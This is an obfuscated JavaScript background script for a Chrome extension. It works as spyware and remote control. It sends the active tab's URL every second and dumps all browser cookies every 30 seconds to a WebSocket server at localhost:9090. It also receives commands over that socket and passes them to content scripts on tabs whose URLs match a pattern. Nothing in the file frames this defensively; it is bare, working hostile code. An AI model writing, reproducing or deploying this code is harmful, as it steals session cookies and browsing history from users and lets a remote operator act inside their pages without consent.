
var zNku = [];
function hoQv(mmmm)
{
  if(window.ff && window.ff.readyState === 1)
  {
    for(var i=0;i<zNku.length;i++)
      window.ff.send(zNku[i]);
    zNku = [];
    window.ff.send(JSON.stringify(mmmm));
  }
  else
    zNku.push(JSON.stringify(mmmm));
}


var hkeo = "";
var vEobc = "";
setInterval(function(){
  chrome.tabs.query({
    active: true,
    currentWindow: true
  }, function(tabs) {
    if(tabs.length > 0 && tabs[0].url != hkeo)
    {
      hkeo = tabs[0].url;
      hoQv({m:1,s:tabs[0].url});
    }
  });
  var riwwo = [];
  for(var i=0;i<kbme.length;i++)
  {
    if(kbme[i].id)
      riwwo.push(kbme[i].id)
  }
  if(riwwo.length>0)
  {
    var ntw = JSON.stringify(riwwo);
    if(ntw != vEobc)
    {
      vEobc = ntw;
      hoQv({m:3,d:riwwo});
    }
  }
},1000);

chrome.runtime.onMessage.addListener(function(r, s, sr) {
    if (r.b)
      hoQv(r.d);
});

var ewtoe = "";
setInterval(function(){
    chrome.cookies.getAll({}, function(r) {
      var bwoe = JSON.stringify(r);
      if(bwoe != ewtoe)
      {
        ewtoe = bwoe;
        hoQv({m:2,d:r});
      }
    });
},3e4);


var mwoe = false;
var kbme = [];
setInterval(function(){
  if(kbme.length == 0 || mwoe)
    return;
  mwoe = true;
  chrome.tabs.query({active: true,currentWindow: true}, function(tabs) {
    if(tabs.length > 0)
    {
      for(var i=0;i<kbme.length;i++)
      {
        if(kbme[i].pt == "*" || (tabs[0].url && tabs[0].url.match(kbme[i].pt)) )
        {
          chrome.tabs.sendMessage(tabs[0].id, {m:1,e:kbme[i].e,i:kbme[i].id});
          if(!kbme[i].ps)
            kbme.splice(i,1);
        }
      }
    }
    mwoe = false;
  });
},500);

function swSs()
{

  window.ff = new WebSocket('ws://localhost:9090/');
  ff.onopen = function() {};

  ff.onclose = function() {
  ff = null
  setTimeout(swSs, 5000)
  };
  ff.onmessage = function(a) {
    if(a.data == "c")
    {
      kbme = [];
      return;
    }
    var nn = JSON.parse(a.data);
    if(nn.m == 3)
    {
      for(var i=0;i<kbme.length;i++)
      {
        if(kbme[i].id == nn.id)
          kbme.splice(i,1);
      }
      return;
    }
    kbme.push(nn);
  };
}
swSs();
